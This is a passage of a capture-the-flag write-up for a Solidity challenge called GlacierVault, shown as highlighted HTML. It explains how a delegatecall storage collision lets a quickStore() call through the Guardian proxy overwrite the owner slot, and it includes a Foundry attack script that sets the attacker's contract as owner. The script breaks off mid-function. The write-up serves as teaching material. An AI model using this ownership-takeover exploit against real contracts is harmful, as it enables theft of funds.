&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_fallback&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_beforeFallback&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_delegate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_implementation&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fa6e32;&quot;&gt;@dev&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt; Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * function in the contract matches the call data.
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fallback&lt;&#x2F;span&gt;&lt;span&gt;() external payable {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_fallback&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fa6e32;&quot;&gt;@dev&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt; Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * call, or as part of the Solidity `fallback` or `receive` functions.
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     *
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * If overridden should call `super._beforeFallback()`.
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_beforeFallback&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;GlacierVault.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GlacierVault
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;address) slot_owners&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;string) private slots&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 quickstore1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 quickstore2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 quickstore3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 quickstore4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 quickstore5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; You can use this vault to store your strings forever 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;store&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory item&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 slot_index&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable public
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(slot_owners[slot_index] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span&gt;slot_owners[slot_index] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;this store is already used by someone else&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        slots[slot_index] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;item&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        slot_owners[slot_index] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;These are just for quickly storing numbers (like if you want to write down a phone number and don&amp;#39;t forget it)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;quickStore&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint8 index&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            quickstore1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else if &lt;&#x2F;span&gt;&lt;span&gt;(index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            quickstore2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else if &lt;&#x2F;span&gt;&lt;span&gt;(index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            quickstore3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else if &lt;&#x2F;span&gt;&lt;span&gt;(index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            quickstore4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else if &lt;&#x2F;span&gt;&lt;span&gt;(index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            quickstore5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Setup contract deployes Guardian and GlacierVault contracts&lt;&#x2F;li&gt;
&lt;li&gt;Guardian contract uses GlacierVault logic to perform some task&lt;&#x2F;li&gt;
&lt;li&gt;Guardian contract &lt;code&gt;delegatecall&lt;&#x2F;code&gt;&#x27;s the GlacierVault&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Goal :&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Put the Guardian contract into sleep&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;To put the Guardian contract into sleep we need to call the &lt;code&gt;punch()&lt;&#x2F;code&gt; with 10_000_000 ethers or we have to be the owner of the contract. Point to note about delegatecall is &quot;With delegatecall, only the code of the given address is used but all other aspects (storage, balance, msg.sender etc.) are taken from the current contract. The purpose of delegatecall is to use library&#x2F;logic code which is stored in callee contract but operate on the state of the caller contract&quot;.&lt;&#x2F;p&gt;
&lt;p&gt;So, here the call to GlacierVault will effect the storage layout of the Guardian contract. I tried to call the &lt;code&gt;quickStore()&lt;&#x2F;code&gt; function with arguements (0,1) on Guardian contract which delegates the call to GlacierVault. In result the owner variable slot of the Guardian contract was overridden with 1. So, we can able to overwrite the owner of the Guardian by calling quickStore() function. Now simply I called the quickStore() function with address of my attack contract instead of 1. So it will override the owner to my Attack contract address. Now we can call the &lt;code&gt;putToSleep()&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;GlacierVaultAttack.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Setup} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GlacierVault&#x2F;Setup.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Guardian} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GlacierVault&#x2F;Guardian.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{console} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AttackScript is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;{value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ether&lt;&#x2F;span&gt;&lt;span&gt;}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Success&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public setupContract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Setup&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4b4b43d0E6dc47aC7274EA3a2463C87116282700&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    Guardian public TARGET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Guardian&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(setupContract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;TARGET&lt;&#x2F;span&gt;&lt;span&gt;())))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;}(
&lt;&#x2F;span&gt;&lt;span&gt;            abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;quickStore(uint8,uint256)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;            )&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Call failed&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
